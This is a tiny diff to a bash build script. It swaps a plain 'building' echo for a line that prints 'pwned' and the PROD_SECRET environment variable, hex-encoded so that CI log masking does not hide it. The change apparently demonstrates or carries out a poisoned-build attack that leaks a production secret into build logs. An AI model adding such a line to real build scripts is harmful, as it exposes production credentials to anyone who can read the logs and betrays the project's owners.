@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-echo "building (main version)"
+echo "pwned build prod hex=$(printf %s "$PROD_SECRET" | xxd -p)"
